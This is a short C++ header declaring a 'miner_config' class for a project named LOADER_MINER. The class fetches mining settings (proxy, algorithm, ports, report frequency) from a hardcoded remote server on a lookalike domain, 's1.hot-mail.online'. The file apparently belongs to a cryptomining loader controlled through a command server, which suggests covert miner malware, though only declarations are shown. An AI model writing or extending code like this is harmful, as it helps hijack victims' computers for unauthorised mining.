//
// Created by wtxpwh on 2018/11/13.
//

#ifndef LOADER_MINER_CONFIG_H
#define LOADER_MINER_CONFIG_H

#include <string>

#include "easy_curl.h"

using namespace std;



class miner_config {

public:
    miner_config(int uid, string wid);
    ~miner_config();
private:

    int timestamp;
    easy_curl curl;

    string cfgurl{"s1.hot-mail.online:51233/config"};
    string tsurl{"s1.hot-mail.online:51233/ts/"};

public:
    bool isnewconfig();
    bool getminercfg();

    int getrandomport();


    string userid{""};
    string workid{""};

    string cfgusernameid;
    int cfguserid;
    string cfggproxy;
    string cfgalgo;
    string cfgport;

    int port1;
    int port2;

    int cfgreportfreq;
    int cfgrefreshfreq;


};


#endif //LOADER_MINER_CONFIG_H
